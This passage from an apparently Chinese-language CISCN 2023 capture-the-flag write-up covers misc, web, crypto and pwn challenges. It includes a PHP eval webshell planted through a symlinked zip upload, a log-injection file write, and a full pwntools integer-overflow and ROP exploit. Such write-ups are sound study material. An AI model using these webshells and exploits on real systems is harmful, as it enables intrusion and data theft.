number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">]</span>yy <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token comment">#用for循环将文件中的值赋值给x，y</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#画图</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> c<span class="token operator">=</span>color<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> edgecolors<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/Ciscn%20%E6%95%A3%E7%82%B9%E5%9B%BE.png" style="zoom:67%;" /><blockquote><p> flag{202305012359}</p></blockquote><h4 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量:"></a>被加密的生产流量:</h4><p>追踪流发现base编码</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230527141401.png" style="zoom: 33%;" /><p>base32编码，解码得到flag</p><blockquote><p>flag{c1f_fi1g_1000}</p></blockquote><h4 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell:"></a>pyshell:</h4><p>本题为python的shell终端，拼接读取flag的字符串后用eval()进行执行，即可获得flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145149.png" style="zoom: 67%;" /><blockquote><p>flag{2c9b76d6-8379-4dd8-a95a-a383420575f5}</p></blockquote><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="unzip："><a href="#unzip：" class="headerlink" title="unzip："></a>unzip：</h4><p>建立软连接实现，</p><p>参考博客：<code>https://forum.butian.net/share/906</code></p><p>先建立软连接</p><pre class="line-numbers language-none"><code class="language-none">ln -s &#x2F;var&#x2F;www&#x2F;html test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">zip --symlinks test.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建 test文件</p><pre class="line-numbers language-none"><code class="language-none">mkdir test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cd 进去创建cmd.php</p><pre class="line-numbers language-none"><code class="language-none">vim cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>往里面写入一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>退回上级目录，压缩test文件夹</p><pre class="line-numbers language-none"><code class="language-none">zip -r test1.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先上传test.zip 后上传test1.zip，然后直接蚁剑连上</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;eci-2ze4nvw7kl74qmeixz3h.cloudeci1.ichunqiu.com&#x2F;cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到flag即可</p><h4 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h4><p>对/flag下所有提供的参数进行测试，发现提供的第二个参数可以到日志</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145934.png" style="zoom:50%;" /><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150053.png" style="zoom:50%;" /><p>过滤了post和get，不能直接将木马写入参数中执行</p><p>这里采用echo重定向的方式，将待执行的命令写入到User-Agent中，并重定向到/app/log/a.php中</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150351.png" style="zoom:50%;" /><p>访问/log/a.php发现可以成功执行</p><p>最后在env环境变量中找到flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150515.png" style="zoom: 50%;" /><blockquote><p>flag{290a8dfa-4d33-4ae2-a781-ef17e464d0bc}</p></blockquote><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd:"></a>Sign_in_passwd:</h4><p>是一道Base64换表题目，使用CyberChef的Base64转码功能，可以自定义Base64表格，输入需要转码的字符串，即可得flag ，题目给的表中有部分经过url编码，解码后便可以正常实现</p><h4 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" title="基于国密SM2算法的密钥密文分发:"></a>基于国密SM2算法的密钥密文分发:</h4><p>非预期解，在登录获取id并且发送完公钥后，通过quantum获取服务器端密钥的密文后，search查看发现服务器端存在密钥的明文，即quantumStringServer，发送该明文进行check获取flag。</p><p>​                                <a href="https://imgse.com/i/p9LeEZj"><img src="https://s1.ax1x.com/2023/05/27/p9LeEZj.png" alt="p9LeEZj.png" style="zoom: 50%;" />        </a>    </p><blockquote><p>flag{fe362b36-56e5-4b6c-a5cc-12d3e755ce0}</p></blockquote><h4 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量:"></a>可信度量:</h4><p>非预期解，通过命令全局搜索flag字符串。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">grep <span class="token operator">-</span>ra <span class="token string">"flag&#123;"</span> <span class="token operator">/</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C\OYUNA5G0`(OO)VX%3$@P947.png)</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿:"></a>烧烤摊儿:</h4><p>首先，分析vip函数，发现无符号整数存在整数溢出，因此考虑输入-1000000使余额溢出到大于100000。</p><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C]I{EODH[FQ1S]6X$Y}L0N8Y.png)</p><p>之后买下该店后通过栈溢出劫持程序执行流，因为本题禁止了execve的系统调用，因此考虑orw读取flag。只需要控制栈溢出后分别执行open，read，write三个函数。</p><p>完整exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#io = process("./shaokao")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>open_addr <span class="token operator">=</span> <span class="token number">0x457C90</span>read_addr <span class="token operator">=</span> <span class="token number">0x457DC0</span>write_addr <span class="token operator">=</span> <span class="token number">0x457E60</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx <span class="token operator">=</span> <span class="token number">0x4a404b</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token comment">#integer overflow</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1000000'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span><span class="token comment">#rop orw</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'./flag\x00\x00'</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x16</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 